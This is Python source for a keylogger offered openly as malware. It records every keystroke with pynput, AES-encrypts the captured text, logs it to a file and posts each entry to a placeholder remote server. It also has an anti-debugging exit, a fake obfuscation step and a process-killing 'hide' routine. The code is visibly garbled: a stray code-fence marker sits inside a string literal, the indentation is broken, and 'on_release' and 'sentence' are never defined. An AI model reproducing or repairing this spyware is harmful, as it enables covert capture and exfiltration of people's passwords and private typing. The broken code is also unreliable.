import pynput
from pynput.keyboard import Key, Listener
import requests
import os
import base64
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import sys
import time
import threading
import ctypes
import hashlib

# Configuration
CONFIG = {
    'REMOTE_URL': 'http://your-remote-server.com/log',
    'ENCRYPTION_KEY': get_random_bytes(16),  # AES key
    'LOG_FILE': 'keylog.enc',
    'MAX_LOG_SIZE': 10 * 1024 * 1024  # 10 MB
}

# Obfuscation function
def obfuscate_code(code):
    return code.encode('utf-8').hex()

# Deobfuscation function
def deobfuscate_code(obfuscated_code):
    return bytes.fromhex(obfuscated_code).decode('utf-8')

# AES encryption/decryption functions
def pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def unpad(s):
    return s[:-ord(s[len(s)-1:])]

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(data).encode())).decode()

def decrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return unpad(base64.b64decode(data).decode())

# Function to send log to remote server
def send_log(log):
    url = CONFIG['REMOTE_URL']
    headers = {'Content-Type': 'application/json'}
    data = {'log': log}
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 200:
        print("Log sent successfully")
    else:
        print("Failed to send log")

# Function to capture keystrokes and reconstruct sentences
def on_press(key):
    try:
        keys = key.char
        if keys.isprintable():
            sentence.append(keys)
        elif keys == '\r':  # Enter key
            sentence.append('\n')
            encrypted_sentence = encrypt(''.join(sentence), CONFIG['ENCRYPTION_KEY'])
            write_log(encrypted_sentence)
            send_log(encrypted_sentence)
            sentence = []
        elif keys == '\b':  # Backspace key
            if sentence:
                sentence.pop()
    except AttributeError:
        if key == Key.space:
            sentence.append(' ')
        elif key == Key.backspace:
            if sentence:
                sentence.pop()
        elif key == Key.enter:
            sentence.append('\n')
        elif key == Key.shift:
            sentence.append('+')
        elif key == Key.ctrl:
            sentence.append('^')
        elif key == Key.alt:
            sentence.append('%')
        elif key == Key.caps_lock:
            sentence.append('CAPS')
        elif key == Key.esc:
            sentence.append('ESC```python
        elif key == Key.delete:

                if sentence:
                    sentence.pop()
        else:
            sentence.append(f"[{key}]")
        encrypted_sentence = encrypt(''.join(sentence), CONFIG['ENCRYPTION_KEY'])
        write_log(encrypted_sentence)
        send_log(encrypted_sentence)

# Function to write log to file
def write_log(log):
    with open(CONFIG['LOG_FILE'], 'a') as f:
        f.write(log + '\n')
        check_log_size(CONFIG['LOG_FILE'])

# Function to check log file size and rotate if necessary
def check_log_size(log_file):
    if os.path.getsize(log_file) > CONFIG['MAX_LOG_SIZE']:
        rotate_log(log_file)

# Function to rotate log file
def rotate_log(log_file):
    current_log = log_file
    new_log = log_file + ".1"
    os.rename(current_log, new_log)

# Function to hide the keylogger process
def hide_process():
    subprocess.Popen("taskkill /F /IM python.exe", shell=True)

# Anti-debugging check
def is_debugging():
    return sys.gettrace() is not None

if is_debugging():
    print("Debugging detected! Exiting...")
    sys.exit(1)

# Obfuscate the main code
obfuscated_code = obfuscate_code(sys._getframe().f_code.co_filename)
with open(obfuscated_code, 'w') as f:
    f.write(deobfuscate_code(sys._getframe().f_code.co_filename))

# Start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    hide_process()

# Create a separate thread for the keylogger
def start_threaded_keylogger():
    threading.Thread(target=start_keylogger).start()

# Main function
def main():
    start_threaded_keylogger()
    while True:
        time.sleep(60)  # Keep the main thread alive

if __name__ == "__main__":
    main()
